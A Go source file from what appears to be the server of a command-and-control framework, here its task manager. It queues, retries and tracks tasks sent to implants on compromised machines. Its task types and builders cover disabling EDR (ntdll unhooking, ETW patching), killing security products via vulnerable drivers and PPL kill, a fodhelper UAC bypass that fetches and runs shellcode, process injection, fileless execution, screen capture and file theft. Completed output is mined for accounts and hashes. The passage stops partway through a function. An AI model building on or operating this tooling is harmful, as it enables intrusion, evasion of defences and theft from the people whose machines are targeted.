package task

import (
	"encoding/json"
	"fmt"
	"sync"
	"sync/atomic"
	"time"

	"toshell/internal/common/avops"
	"toshell/internal/common/types"
	"toshell/internal/server/avdetect"
	"toshell/internal/server/database"
	"toshell/internal/server/intel"
	"toshell/internal/server/logging"
	"toshell/internal/server/session"
)

type Manager struct {
	tasks       map[uint64]*types.TaskInfo
	pending     []*types.TaskInfo
	completed   []*types.TaskInfo
	mu          sync.RWMutex
	sessionMgr  *session.Manager
	taskCounter uint64

	// 会话热迁移（重连续传）：大文件直传断点状态。
	// 挂在全局 Manager 上而非监听器实例：listener stop/start 会重建实例，
	// 实例字段会在重启时丢失，导致断点续传失效（退化为全量重推）。
	transferMu sync.RWMutex
	transfers  map[uint64]*TransferState

	// waiters 任务终结通知的等待者（taskID → 等待者列表），受 m.mu 保护。
	// 与任务状态**共用同一把锁**：注册与状态变更必须互为原子点，否则会丢通知
	// （详见 wait.go 的 Subscribe 注释）。
	waiters map[uint64][]*waiter
}

// TransferState 记录一个进行中的大文件直传断点（服务端视角，taskID 关联）。
type TransferState struct {
	TransferID string
	Size       int64
	Received   int64
}

var (
	manager *Manager
	once    sync.Once
)

const (
	StatusPending   = "pending"
	StatusSent      = "sent"
	StatusCompleted = "completed"
	StatusFailed    = "failed"
	StatusTimeout   = "timeout"
)

const (
	TaskTypeCommand    = "command"
	TaskTypeFileList   = "file_list"
	TaskTypeFileDown   = "file_download"
	TaskTypeFileUp     = "file_upload"
	TaskTypeFileDel    = "file_delete"
	TaskTypeProcList   = "process_list"
	TaskTypeProcKill   = "process_kill"
	TaskTypeProcInject = "process_inject"
	TaskTypeProcSpoof  = "process_spoof"
	TaskTypeAutoInject = "auto_inject"
	TaskTypeSpawn      = "spawn"

	TaskTypeBOFLoad   = "bof_load"
	TaskTypeShell     = "shell"
	TaskTypeInjection = "injection"
	TaskTypeExit      = "exit"

	// TaskTypeFilelessExec 全内存无文件执行：shellcode / BOF / DLL 不落盘执行。
	TaskTypeFilelessExec = "fileless_exec"

	// TaskTypeScreenStream 实时屏幕流（start/stop）。
	TaskTypeScreenStream = "screen_stream"

	// TaskTypeScreenshot 屏幕截图（支持 monitor/max_width/format/quality 参数）。
	TaskTypeScreenshot = "screenshot"

	// TaskTypeRelay 运行时中继控制（start 监听端口 / stop）。
	TaskTypeRelay = "relay"

	// TaskTypeEDRBlind EDR 失明（ntdll 脱钩 + ETW patch + Autologger 清理）。
	TaskTypeEDRBlind = "edr_blind"

	// TaskTypeEDRKill EDR 击杀（按进程名终止杀软/EDR）。
	TaskTypeEDRKill = "edr_kill"

	// BYOVD / PPL
	TaskTypeBYOVDLoad   = "byovd_load"
	TaskTypeBYOVDUnload = "byovd_unload"

	// TaskTypeBYOVDKill 驱动击杀：调用操作员自备驱动的无鉴权终止 IOCTL（设备/IOCTL 由服务端下发）
	TaskTypeBYOVDKill = "byovd_kill"
	TaskTypePPLKill   = "ppl_kill"

	// TaskTypeUACBypass UAC 提权（fodhelper + 内存执行 shellcode 回连上线）。
	TaskTypeUACBypass = "uac_bypass"

	// TaskTypeExecModule 按需加载内存模块（v1.4.0 S4）。
	//
	// Data 里是 moduleabi.ArgumentHeader 的 JSON（含一次性 token），**不含模块二进制**：
	// 二进制走 TypeModuleData 帧单独下发。这样任务表/任务列表/SSE 里只会出现一个短 token，
	// 不会出现多 MB 的 base64 —— 后者会让"任何能读任务列表的人"都拿到模块字节。
	TaskTypeExecModule = "exec_module"
)

type TaskParams struct {
	Command     string
	Args        []string
	ExecuteType string
	Timeout     uint32
	TaskType    string
	Path        string
	PID         uint32
	Data        string
}

func New(sessMgr *session.Manager) *Manager {
	once.Do(func() {
		manager = newManager(sessMgr)
	})
	return manager
}

// NewIsolated 创建一个**不与全局单例共享状态**的 Manager。
//
// 存在的理由：New 是 sync.Once 单例，多个测试（或嵌入式多实例场景）共用同一个实例会
// 互相污染——一个用例清空的 pending 会出现在另一个用例里，任务 id 也会串号。
// 生产路径仍走 New；这里只把「构造一个干净的 Manager」这一步开放出来。
func NewIsolated(sessMgr *session.Manager) *Manager {
	return newManager(sessMgr)
}

func newManager(sessMgr *session.Manager) *Manager {
	return &Manager{
		tasks:      make(map[uint64]*types.TaskInfo),
		pending:    make([]*types.TaskInfo, 0),
		completed:  make([]*types.TaskInfo, 0),
		sessionMgr: sessMgr,
		transfers:  make(map[uint64]*TransferState),
		waiters:    make(map[uint64][]*waiter),
	}
}

func Get() *Manager {
	if manager == nil {
		return nil
	}
	return manager
}

// SeedTaskCounter 把内存任务 id 计数器抬到 >= persistedMax。
//
// 为什么需要：taskCounter 是纯内存 atomic（见 Create 里的 AddUint64），进程重启即归零，
// 于是新任务会从 1 开始编号，与 sqlite `tasks` 表里的历史任务**撞号**——按 id 查任务
// （前端任务列表、Agent 的 internal_task_id 对齐）就会串到旧记录。
// 由 cmd/server 在建库之后用 `MAX(tasks.id)` 调用一次；只在更大的方向抬升，幂等且并发安全。
func (m *Manager) SeedTaskCounter(persistedMax uint64) {
	if m == nil || persistedMax == 0 {
		return
	}
	for {
		cur := atomic.LoadUint64(&m.taskCounter)
		if cur >= persistedMax {
			return
		}
		if atomic.CompareAndSwapUint64(&m.taskCounter, cur, persistedMax) {
			return
		}
	}
}

func (m *Manager) Create(sessionID string, params TaskParams) (*types.TaskInfo, error) {
	m.mu.Lock()
	defer m.mu.Unlock()

	if m.sessionMgr != nil {
		_, err := m.sessionMgr.Get(sessionID)
		if err != nil {
			return nil, fmt.Errorf("session not found: %s", sessionID)
		}
	}

	atomic.AddUint64(&m.taskCounter, 1)
	taskID := atomic.LoadUint64(&m.taskCounter)

	if params.TaskType == "" {
		params.TaskType = TaskTypeCommand
	}

	task := &types.TaskInfo{
		ID:          taskID,
		SessionID:   sessionID,
		TaskType:    params.TaskType,
		Command:     params.Command,
		Args:        params.Args,
		ExecuteType: params.ExecuteType,
		Status:      StatusPending,
		CreatedAt:   time.Now(),
		Timeout:     params.Timeout,
		ExitCode:    -1,
		Path:        params.Path,
		PID:         params.PID,
		Data:        params.Data,
	}

	m.tasks[taskID] = task
	m.pending = append(m.pending, task)

	// 任务下发 → 会话进入忙期：存活判定放宽（长任务执行期间不被误判离线）。
	if m.sessionMgr != nil && sessionID != "" {
		m.sessionMgr.MarkSessionBusy(sessionID, 0) // 忙期默认 = 心跳超时*2
	}

	db := database.Get()
	if db != nil {
		db.CreateTask(task)
	}

	logging.Info("task", "Task created: %d (type: %s) for session %s", taskID, params.TaskType, sessionID)
	return task, nil
}

func (m *Manager) CreateCommand(sessionID, command string, args []string, timeout uint32) (*types.TaskInfo, error) {
	return m.Create(sessionID, TaskParams{
		TaskType: TaskTypeCommand,
		Command:  command,
		Args:     args,
		Timeout:  timeout,
	})
}

// CreateExit 创建"退出"任务：删除主机时推送给植入端，令其停止运行。
func (m *Manager) CreateExit(sessionID string) (*types.TaskInfo, error) {
	return m.Create(sessionID, TaskParams{
		TaskType: TaskTypeExit,
		Timeout:  10,
	})
}

func (m *Manager) CreateFileList(sessionID, path string) (*types.TaskInfo, error) {
	return m.Create(sessionID, TaskParams{
		TaskType: TaskTypeFileList,
		Path:     path,
	})
}

func (m *Manager) CreateFileDownload(sessionID, path string) (*types.TaskInfo, error) {
	return m.Create(sessionID, TaskParams{
		TaskType: TaskTypeFileDown,
		Path:     path,
	})
}

func (m *Manager) CreateFileUpload(sessionID, path, data string) (*types.TaskInfo, error) {
	return m.Create(sessionID, TaskParams{
		TaskType: TaskTypeFileUp,
		Path:     path,
		Data:     data,
	})
}

func (m *Manager) CreateFileDelete(sessionID, path string) (*types.TaskInfo, error) {
	return m.Create(sessionID, TaskParams{
		TaskType: TaskTypeFileDel,
		Path:     path,
	})
}

func (m *Manager) CreateProcessList(sessionID string) (*types.TaskInfo, error) {
	return m.Create(sessionID, TaskParams{
		TaskType: TaskTypeProcList,
	})
}

func (m *Manager) CreateProcessKill(sessionID string, pid uint32) (*types.TaskInfo, error) {
	return m.Create(sessionID, TaskParams{
		TaskType: TaskTypeProcKill,
		PID:      pid,
	})
}

func (m *Manager) CreateBOFLoad(sessionID, data, args string) (*types.TaskInfo, error) {
	return m.Create(sessionID, TaskParams{
		TaskType: TaskTypeBOFLoad,
		Data:     data,
		Command:  args,
	})
}

// CreateScreenshot 创建截图任务。
// params 为可选的截图参数（monitor / max_width / format / quality），
// 植入端按参数裁剪显示器、缩放与编码；为空 = 整屏 + 默认编码（历史行为）。
func (m *Manager) CreateScreenshot(sessionID string, params map[string]interface{}) (*types.TaskInfo, error) {
	data := map[string]interface{}{}
	for k, v := range params {
		if v != nil {
			data[k] = v
		}
	}
	raw, _ := json.Marshal(data)
	return m.Create(sessionID, TaskParams{
		TaskType: TaskTypeScreenshot,
		Data:     string(raw),
	})
}

// CreateScreenStream 创建实时屏幕流任务（action = start / stop）。
// params 为可选的流参数（fps / quality / max_kbps / monitor / max_width / format），
// 植入端按参数采集，并按带宽预算自适应画质；为空表示使用默认值。
func (m *Manager) CreateScreenStream(sessionID, action string, params map[string]interface{}) (*types.TaskInfo, error) {
	data := map[string]interface{}{"action": action}
	for k, v := range params {
		if v == nil {
			continue
		}
		data[k] = v
	}
	raw, _ := json.Marshal(data)
	return m.Create(sessionID, TaskParams{
		TaskType: TaskTypeScreenStream,
		Data:     string(raw),
	})
}

// CreateEDRBlind 创建 EDR 失明任务（ntdll 脱钩 + ETW patch + Autologger 清理）。
func (m *Manager) CreateEDRBlind(sessionID string) (*types.TaskInfo, error) {
	return m.Create(sessionID, TaskParams{
		TaskType: TaskTypeEDRBlind,
		Data:     `{}`,
	})
}

// CreateEDRKill 创建 EDR 击杀任务；processes 为空时植入端使用内置默认杀软进程列表。
func (m *Manager) CreateEDRKill(sessionID string, processes []string) (*types.TaskInfo, error) {
	data, _ := json.Marshal(map[string]interface{}{"processes": processes})
	return m.Create(sessionID, TaskParams{
		TaskType: TaskTypeEDRKill,
		Data:     string(data),
	})
}

// CreateBYOVDLoad 创建 BYOVD 驱动加载任务。
func (m *Manager) CreateBYOVDLoad(sessionID, driverB64, serviceName, deviceName string) (*types.TaskInfo, error) {
	data, _ := json.Marshal(map[string]string{
		"driver_b64":   driverB64,
		"service_name": serviceName,
		"device_name":  deviceName,
	})
	return m.Create(sessionID, TaskParams{
		TaskType: TaskTypeBYOVDLoad,
		Data:     string(data),
	})
}

// CreateBYOVDUnload 创建 BYOVD 驱动卸载任务。
func (m *Manager) CreateBYOVDUnload(sessionID, serviceName string) (*types.TaskInfo, error) {
	data, _ := json.Marshal(map[string]string{"service_name": serviceName})
	return m.Create(sessionID, TaskParams{
		TaskType: TaskTypeBYOVDUnload,
		Data:     string(data),
	})
}

// CreateBYOVDKill 创建 BYOVD 驱动击杀任务。
// device/ioctl 来自操作员驱动档案（加载时登记或驱动目录 manifest 声明）；
// pid 与 processName 二者至少给一个，都为空时任务会直接失败并提示。
func (m *Manager) CreateBYOVDKill(sessionID string, pid uint32, processName, device string, ioctl uint32) (*types.TaskInfo, error) {
	data, _ := json.Marshal(map[string]interface{}{
		"pid":          pid,
		"process_name": processName,
		"device":       device,
		"ioctl":        ioctl,
	})
	return m.Create(sessionID, TaskParams{
		TaskType: TaskTypeBYOVDKill,
		Data:     string(data),
	})
}

// CreatePPLKill 创建 PPL 击杀任务；processes 为空时使用默认杀软列表。
func (m *Manager) CreatePPLKill(sessionID string, processes []string) (*types.TaskInfo, error) {
	data, _ := json.Marshal(map[string]interface{}{"processes": processes})
	return m.Create(sessionID, TaskParams{
		TaskType: TaskTypePPLKill,
		Data:     string(data),
	})
}

// CreateRelayControl 创建运行时中继控制任务（action = start/stop，start 时 addr 为监听地址）。
func (m *Manager) CreateRelayControl(sessionID, action, addr string) (*types.TaskInfo, error) {
	data, _ := json.Marshal(map[string]string{"action": action, "addr": addr})
	return m.Create(sessionID, TaskParams{
		TaskType: TaskTypeRelay,
		Data:     string(data),
	})
}

// CreateUACBypass 创建 UAC 提权任务（payloadURL 为提权进程内存执行的 shellcode 下载地址）。
func (m *Manager) CreateUACBypass(sessionID, payloadURL string) (*types.TaskInfo, error) {
	data, _ := json.Marshal(map[string]string{"payload_url": payloadURL})
	return m.Create(sessionID, TaskParams{
		TaskType: TaskTypeUACBypass,
		Data:     string(data),
	})
}

// CreateFilelessExec 创建全内存无文件执行任务。
// kind ∈ {shellcode, bof, dll, exe_mem}；payloadB64 为载荷的 base64 编码；
// args/entry 为可选参数（BOF 参数 / EXE 命令行 / DLL 导出函数名与镜像名）；
// waitMs > 0 时植入端等待执行线程结束（仅 exe_mem 取值）。
func (m *Manager) CreateFilelessExec(sessionID, kind, payloadB64, args, entry string, waitMs int) (*types.TaskInfo, error) {
	data := map[string]interface{}{
		"kind":        kind,
		"payload_b64": payloadB64,
		"args":        args,
		"entry":       entry,
	}
	if waitMs > 0 {
		data["wait_ms"] = waitMs
	}
	raw, _ := json.Marshal(data)
	return m.Create(sessionID, TaskParams{
		TaskType: TaskTypeFilelessExec,
		Data:     string(raw),
	})
}

// CreateExecModule 创建"按需加载内存模块"任务（v1.4.0 S4）。
//
// dataJSON 是 moduleabi.ArgumentHeader 的 JSON（module_id/token/sha256/size/abi/args_json）。
// 模块二进制**不在这里**：它由 TaskPusher.PushModuleBlob 以 TypeModuleData 帧先下行，
// 植入端按 token 暂存，任务执行时按 token 取出（取出即删 = 一次性）。
//
// 为什么任务只带 token 而不是带上字节：
//   - 任务表是持久化的（sqlite）并且会被列到接口/SSE/审计日志里，多 MB 的模块
//     会让这些路径全部变重，且等于把"模块"这份资产广播给所有能读任务的人；
//   - token 把"授权"与"字节"解耦：授权是一次性的、可审计的、会过期的，字节只出现
//     在它该出现的那一次下行里。
func (m *Manager) CreateExecModule(sessionID, dataJSON string) (*types.TaskInfo, error) {
	return m.Create(sessionID, TaskParams{
		TaskType: TaskTypeExecModule,
		Data:     dataJSON,
		// 默认 120s：模块执行受植入端 heavyExecTimeout（180s）约束，这里略小于它，
		// 让服务端先超时（结果回来晚了也不会把已完成的任务标记成失败）。
		Timeout: 120,
	})
}

func (m *Manager) CreateProcessInject(sessionID string, method string, pid int, shellcode string, dllPath string) (*types.TaskInfo, error) {
	// Create JSON data for injection
	data := map[string]interface{}{
		"method":    method,
		"pid":       pid,
		"shellcode": shellcode,
		"dll_path":  dllPath,
	}
	dataJSON, _ := json.Marshal(data)

	return m.Create(sessionID, TaskParams{
		TaskType: TaskTypeProcInject,
		Data:     string(dataJSON),
	})
}

func (m *Manager) CreateProcessSpoof(sessionID string, method string, targetPath string, parentPID int, shellcode string) (*types.TaskInfo, error) {
	// Create JSON data for spoofing
	data := map[string]interface{}{
		"method":      method,
		"target_path": targetPath,
		"parent_pid":  parentPID,
		"shellcode":   shellcode,
	}
	dataJSON, _ := json.Marshal(data)

	return m.Create(sessionID, TaskParams{
		TaskType: TaskTypeProcSpoof,
		Data:     string(dataJSON),
	})
}

func (m *Manager) Get(id uint64) (*types.TaskInfo, error) {
	// Memory is the source of truth during runtime — it's always more current than DB
	m.mu.RLock()
	task, ok := m.tasks[id]
	m.mu.RUnlock()
	if ok {
		return task, nil
	}

	// Fallback to DB for post-restart recovery (memory cache is empty after restart)
	db := database.Get()
	if db != nil {
		task, err := db.GetTask(id)
		if err == nil {
			m.mu.Lock()
			m.tasks[id] = task
			m.mu.Unlock()
			return task, nil
		}
	}

	return nil, fmt.Errorf("task not found: %d", id)
}

func (m *Manager) GetNext(sessionID string) (*types.TaskInfo, error) {
	m.mu.Lock()
	defer m.mu.Unlock()

	for i, task := range m.pending {
		if task.SessionID == sessionID && task.Status == StatusPending {
			m.pending = append(m.pending[:i], m.pending[i+1:]...)
			task.Status = StatusSent
			now := time.Now()
			task.SentAt = &now
			m.tasks[task.ID] = task

			db := database.Get()
			if db != nil {
				db.UpdateTask(task)
			}

			logging.Debug("task", "Task %d sent to session %s", task.ID, sessionID)
			return task, nil
		}
	}

	return nil, fmt.Errorf("no pending tasks for session: %s", sessionID)
}

// GetNextBatch 从 pending 队列中批量取出指定会话的待执行任务（最多 max 个）。
// HTTP 轮询通道使用：植入端心跳间隔较长，若每次只下发一个任务，
// 多个任务会排队数分钟，表现为"功能无响应"。批量下发后植入端顺序执行。
// 返回空切片表示无待执行任务。
func (m *Manager) GetNextBatch(sessionID string, max int) []*types.TaskInfo {
	if max <= 0 {
		max = 16
	}
	m.mu.Lock()
	defer m.mu.Unlock()

	var out []*types.TaskInfo
	now := time.Now()
	kept := m.pending[:0]
	for _, task := range m.pending {
		if task.SessionID == sessionID && task.Status == StatusPending && len(out) < max {
			task.Status = StatusSent
			task.SentAt = &now
			m.tasks[task.ID] = task
			out = append(out, task)
			continue
		}
		kept = append(kept, task)
	}
	if len(out) > 0 {
		m.pending = kept
		db := database.Get()
		if db != nil {
			for _, t := range out {
				db.UpdateTask(t)
			}
		}
		logging.Debug("task", "Batch %d tasks sent to session %s", len(out), sessionID)
	}
	return out
}

// lookupLocked 取任务；内存缺失时回落到 sqlite `tasks` 表并回填内存（需持有 m.mu）。
//
// 为什么要回落：结果帧到达时任务可能**不在内存**——进程重启后内存 map 是空的，而植入端
// 仍在执行重启前下发的任务，结果会照常上报。旧实现此时直接返回 "task not found"，
// 于是「重启前下发的任务」结果永远丢失（表现为任务卡在 sent，Agent 等不到结果）。
// 回填内存后，该任务的后续结果帧与终结通知都能正常工作（v1.4.0 S2 重启恢复依赖它）。
//
// 幂等性不受影响：回填出来的状态就是库里的终态，Complete/Fail 的终态去重照常生效，
// 重复结果帧依然被忽略。
func (m *Manager) lookupLocked(id uint64) (*types.TaskInfo, bool) {
	if task, ok := m.tasks[id]; ok && task != nil {
		return task, true
	}
	db := database.Get()
	if db == nil {
		return nil, false
	}
	task, err := db.GetTask(id)
	if err != nil || task == nil {
		return nil, false
	}
	if m.tasks == nil {
		m.tasks = make(map[uint64]*types.TaskInfo)
	}
	m.tasks[id] = task
	logging.Info("task", "Task %d 从库中恢复（重启后仍在上报结果）: status=%s", id, task.Status)
	return task, true
}

func (m *Manager) Complete(id uint64, exitCode int32, output, errorMsg string) error {
	m.mu.Lock()
	defer m.mu.Unlock()

	task, ok := m.lookupLocked(id)
	if !ok {
		return fmt.Errorf("task not found: %d", id)
	}

	// 幂等去重：任务已进入终态（completed/failed/timeout）时忽略重复结果帧，
	// 防止重连补发/重复上报导致重复副作用（重复 intel 提取、重复 completed 记录）。
	if task.Status == StatusCompleted || task.Status == StatusFailed || task.Status == StatusTimeout {
		logging.Debug("task", "Task %d already in terminal state %q, ignoring duplicate result", id, task.Status)
		return nil
	}

	task.Status = StatusCompleted
	task.ExitCode = exitCode
	// av_detect 的指纹匹配与结果组装在服务端完成（指纹库可热更新）
	if task.TaskType == "av_detect" {
		output = avdetect.DetectFromOutput(output)
	}
	task.Output = output
	task.Error = errorMsg
	now := time.Now()
	task.CompletedAt = &now

	// 情报提取：从任务输出中抽取 IP/账号/哈希/共享等，跨会话聚合
	if exitCode == 0 && output != "" {
		added := intel.Get().Extract(task.SessionID, task.ID, task.TaskType, output)
		if added > 0 {
			logging.Debug("intel", "Task %d: extracted %d intel item(s)", task.ID, added)
		}
	}

	m.completed = append(m.completed, task)

	// 结果归位 → 任务完成；给会话短暂忙期宽限，覆盖连续任务间的收尾（避免下一任务紧接时误判）
	if m.sessionMgr != nil && task.SessionID != "" {
		m.sessionMgr.MarkSessionBusy(task.SessionID, 30*time.Second)
	}

	// 从 pending 中移除（防止无限增长）
	m.removeFromPending(id)

	db := database.Get()
	if db != nil {
		db.UpdateTask(task)
	}

	// 终态变更点：唤醒所有等待者（事件驱动等待的唯一通知源）。
	m.notifyLocked(id)

	logging.Info("task", "Task %d completed with exit code %d", id, exitCode)
	return nil
}

func (m *Manager) Fail(id uint64, errorMsg string) error {
	m.mu.Lock()
	defer m.mu.Unlock()

	task, ok := m.lookupLocked(id)
	if !ok {
		return fmt.Errorf("task not found: %d", id)
	}

	// 幂等去重：终态任务忽略重复失败帧
	if task.Status == StatusCompleted || task.Status == StatusFailed || task.Status == StatusTimeout {
		logging.Debug("task", "Task %d already in terminal state %q, ignoring duplicate fail", id, task.Status)
		return nil
	}

	task.Status = StatusFailed
	task.Error = errorMsg
	now := time.Now()
	task.CompletedAt = &now

	m.completed = append(m.completed, task)

	// 结果归位：给会话短暂忙期宽限（连续任务收尾）
	if m.sessionMgr != nil && task.SessionID != "" {
		m.sessionMgr.MarkSessionBusy(task.SessionID, 30*time.Second)
	}

	// 从 pending 中移除（防止无限增长）
	m.removeFromPending(id)

	db := database.Get()
	if db != nil {
		db.UpdateTask(task)
	}

	m.notifyLocked(id)

	logging.Error("task", "Task %d failed: %s", id, errorMsg)
	return nil
}

// Expire 把一条仍未终结的任务标记为 timeout（服务端侧超时收口，v1.4.0 S6）。
//
// 为什么需要它：在 S6 之前，服务端**从不**把任务置为 timeout —— StatusTimeout 只作为
// "读取侧判断出现"（见 wait.go 的终态判定）。于是"服务端认定这次下发超时了"这件事
// 没有落点：任务永远停在 sent，操作员在任务列表里看不到结论，Agent 的等待方也只能
// 靠自己的超时收场。AV-Ops 的显式超时（timeout_sec）要的正是这个可判定结论。
//
// 它同时是"破坏性任务禁止自动重试"的**第二条独立保证**：ListReplayable/RequeueSent
// 只看 pending/sent，任务一旦进入终态（timeout 也是终态）就天然不会被自动重投递。
// 也就是说，哪怕将来有人新增了一条重投递路径却忘了调 avops.TaskNoRetry，
// "已经判定超时的任务"依然不会被重发。
func (m *Manager) Expire(id uint64, reason string) error {
	m.mu.Lock()
	defer m.mu.Unlock()

	task, ok := m.lookupLocked(id)
	if !ok {
		return fmt.Errorf("task not found: %d", id)
	}
	// 终态去重：已完成/已失败/已超时的任务不允许被改写成 timeout
	// （结果帧与超时看门狗会并发到达，谁先到谁说话）。
	if task.Status == StatusCompleted || task.Status == StatusFailed || task.Status == StatusTimeout {
		return nil
	}

	task.Status = StatusTimeout
	task.Error = reason
	now := time.Now()
	task.CompletedAt = &now

	m.completed = append(m.completed, task)
	m.removeFromPending(id)

	db := database.Get()
	if db != nil {
		db.UpdateTask(task)
	}

	// 终态变更点：唤醒等待者（Agent 的 task_wait 等会立刻拿到"超时"结论，
	// 而不是各自挂满自己的超时）。
	m.notifyLocked(id)

	logging.Warn("task", "Task %d expired: %s", id, reason)
	return nil
}

// UpdateProgress 更新任务传输进度（0-100），不改变状态。
// 大文件下载/上传分块直传时由监听器随帧调用，前端据此显示进度条。
func (m *Manager) UpdateProgress(id uint64, progress int) error {
	m.mu.Lock()
	defer m.mu.Unlock()

	task, ok := m.tasks[id]
	if !ok {
		return fmt.Errorf("task not found: %d", id)
	}
	if progress < 0 {
		progress = 0
	}
	if progress > 100 {
		progress = 100
	}
	if task.Progress == progress {
		return nil
	}
	task.Progress = progress
	if db := database.Get(); db != nil {
		db.UpdateTask(task)
	}
	return nil
}

// removeFromPending 从 pending 列表中移除指定任务（需持有 m.mu 锁）
func (m *Manager) removeFromPending(id uint64) {
	for i, t := range m.pending {
		if t.ID == id {
			m.pending = append(m.pending[:i], m.pending[i+1:]...)
			return
		}
	}
}

func (m *Manager) ListBySession(sessionID string) []*types.TaskInfo {
	m.mu.RLock()
	defer m.mu.RUnlock()

	var tasks []*types.TaskInfo
	for _, task := range m.tasks {
		if task.SessionID == sessionID {
			tasks = append(tasks, task)
		}
	}

	return tasks
}

// TrackTransfer 记录/更新大文件直传断点（重连续传）。
// 新 transfer_id 视为新传输会话：重置进度。
func (m *Manager) TrackTransfer(taskID uint64, transferID string, size int64, received int64) {
	if taskID == 0 {
		return
	}
	m.transferMu.Lock()
	defer m.transferMu.Unlock()
	st, ok := m.transfers[taskID]
	if !ok || st.TransferID != transferID {
		st = &TransferState{TransferID: transferID, Size: size}
		m.transfers[taskID] = st
	}
	if received > st.Received {
		st.Received = received
	}
}

// GetTransfer 读取大文件直传断点。
func (m *Manager) GetTransfer(taskID uint64) (*TransferState, bool) {
	m.transferMu.RLock()
	defer m.transferMu.RUnlock()
	st, ok := m.transfers[taskID]
	if !ok {
		return nil, false
	}
	cp := *st
	return &cp, true
}

// ClearTransfer 清除断点（传输完成/取消时调用）。
func (m *Manager) ClearTransfer(taskID uint64) {
	m.transferMu.Lock()
	defer m.transferMu.Unlock()
	delete(m.transfers, taskID)
}

// ListReplayable 返回指定会话中"应补发"的任务：
// pending（尚未派发）与 sent（已派发但未收到结果，可能因断连丢失）。
// completed/failed/timeout 等终态任务不补发。会话热迁移（重连续传）使用。
//
// ⚠️ **破坏性任务（AV-Ops L1 起）不在此列**（v1.4.0 S6）：
// 判定依据是任务类型（avops.TaskNoRetry），见下方循环里的注释 —— 这里是"断线重连补发"
// 这条自动重投递路径的唯一出口（TCP/WS/MQTT 三个监听器的热迁移都走本函数）。
func (m *Manager) ListReplayable(sessionID string) []*types.TaskInfo {
	m.mu.RLock()
	defer m.mu.RUnlock()

	var out []*types.TaskInfo
	skipped := 0
	for _, task := range m.tasks {
		if task.SessionID != sessionID {
			continue
		}
		if task.Status != StatusPending && task.Status != StatusSent {
			continue
		}
		// 破坏性动作**禁止自动重投递**：断线重连补发是"同一个 task ID 再送一次"，
		// 而植入端的结果缓存会在每次新连接时清空（见 implant main.go 的 clearResultCache 注释），
		// 因此重发 = 再执行一次（二次 patch EDR / 二次加载驱动 / 二次杀进程）。
		// 宁可让操作员在排障入口看到"这条任务没有补发，请确认后再下发一次（新 task ID）"，
		// 也不要赌"植入端可能已经执行过了"。
		if avops.TaskNoRetry(task.TaskType) {
			skipped++
			continue
		}
		out = append(out, task)
	}
	if skipped > 0 {
		logging.Warn("task", "会话 %s 有 %d 条破坏性在途任务未补发（禁止自动重投递，"+
			"请确认执行结果后再决定是否重新下发）", sessionID, skipped)
	}
	return out
}

// RequeueSent 把指定会话中处于 sent 状态的任务重新放回 pending 队列，
// 供轮询通道（HTTP）在心跳时再次下发（断连导致结果丢失的重试）。
// 仅重入队超过 staleAfter 仍无结果的任务（防止长任务执行中被打断重复派发）。
// 返回被重新入队的任务数。
//
// 保留这个签名是为了不动既有调用点（internal/server/listener/http_polling.go）；
// 需要知道"有多少条被拒绝重投递"时用 RequeueSentEx。
func (m *Manager) RequeueSent(sessionID string, staleAfter time.Duration) int {
	requeued, _ := m.RequeueSentEx(sessionID, staleAfter)
	return requeued
}

// RequeueSentEx 是 RequeueSent 的扩展版：额外返回因"破坏性任务禁止自动重试"而被
// **拒绝重投递**的任务数（v1.4.0 S6）。
//
// 为什么单独返回被拒条数：这条路径的失败是"静默的"——任务停在 sent，操作员看不到
// 任何错误。把条数暴露出来，既能在日志里给出解释，也能让单测直接断言
// "重投递被拒绝"而不是"碰巧没重投递"。
//
// ⚠️ 被拒的任务**保持 sent 状态**，不改成 failed/timeout：我们并不知道植入端有没有
// 执行过它（结果可能只是丢在回程上）。擅自改成终态会让操作员误以为"没执行"，
// 从而重新下发 —— 那正是这条保护要避免的事。它们最终会由 CleanupOldTasks 按时间回收。
func (m *Manager) RequeueSentEx(sessionID string, staleAfter time.Duration) (requeued, refused int) {
	m.mu.Lock()
	defer m.mu.Unlock()

	now := time.Now()
	for _, task := range m.tasks {
		if task.SessionID != sessionID || task.Status != StatusSent {
			continue
		}
		if task.SentAt != nil && now.Sub(*task.SentAt) < staleAfter {
			continue // 刚派发不久，植入端可能仍在执行
		}
		// 破坏性动作**禁止自动重投递**（HTTP 轮询通道这条路径）。
		// 与 ListReplayable 用同一个判定（avops.TaskNoRetry），保证两条路径口径一致：
		// 只堵一条会让"换个通道就重发"成为漏网。
		if avops.TaskNoRetry(task.TaskType) {
			refused++
			continue
		}
		task.Status = StatusPending
		// 防重复入队
		dup := false
		for _, p := range m.pending {
			if p.ID == task.ID {
				dup = true
				break
			}
		}
		if !dup {
			m.pending = append(m.pending, task)
		}
		requeued++
	}
	if refused > 0 {
		logging.Warn("task", "会话 %s 有 %d 条破坏性任务已超期无结果，但**拒绝自动重投递**"+
			"（重发=再执行；请确认目标机现状后自行重新下发，会分配新的 task ID）", sessionID, refused)
	}
	if requeued > 0 {
		logging.Debug("task", "Requeued %d stale sent task(s) for session %s", requeued, sessionID)
	}
	return requeued, refused
}

func (m *Manager) ListPending() []*types.TaskInfo {
	m.mu.RLock()
	defer m.mu.RUnlock()

	result := make([]*types.TaskInfo, len(m.pending))
	copy(result, m.pending)
	return result
}

func (m *Manager) ListCompleted() []*types.TaskInfo {
	m.mu.RLock()
	defer m.mu.RUnlock()

	result := make([]*types.TaskInfo, len(m.completed))
	copy(result, m.completed)
	return result
}

func (m *Manager) ListAll() []*types.TaskInfo {
	m.mu.RLock()
	defer m.mu.RUnlock()

	tasks := make([]*types.TaskInfo, 0, len(m.tasks))
	for _, task := range m.tasks {
		tasks = append(tasks, task)
	}

	return tasks
}

func (m *Manager) Delete(id uint64) error {
	m.mu.Lock()
	defer m.mu.Unlock()

	_, ok := m.tasks[id]
	if !ok {
		return fmt.Errorf("task not found: %d", id)
	}

	delete(m.tasks, id)

	for i, task := range m.pending {
		if task.ID == id {
			m.pending = append(m.pending[:i], m.pending[i+1:]...)
			break
		}
	}

	// 任务被删除 = 对等待者而言"消失"：必须唤醒它们，否则等待者会一直挂到超时
	// （调用方醒来后会看到任务查不到，按 vanished 处理）。
	m.notifyLocked(id)

	logging.Info("task", "Task %d deleted", id)
	return nil
}

func (m *Manager) Cancel(id uint64) error {
	m.mu.Lock()
	defer m.mu.Unlock()

	task, ok := m.tasks[id]
	if !ok {
		return fmt.Errorf("task not found: %d", id)
	}

	if task.Status != StatusPending {
		return fmt.Errorf("cannot cancel task in status: %s", task.Status)
	}

	task.Status = StatusFailed
	task.Error = "cancelled by operator"

	for i, t := range m.pending {
		if t.ID == id {
			m.pending = append(m.pending[:i], m.pending[i+1:]...)
			break
		}
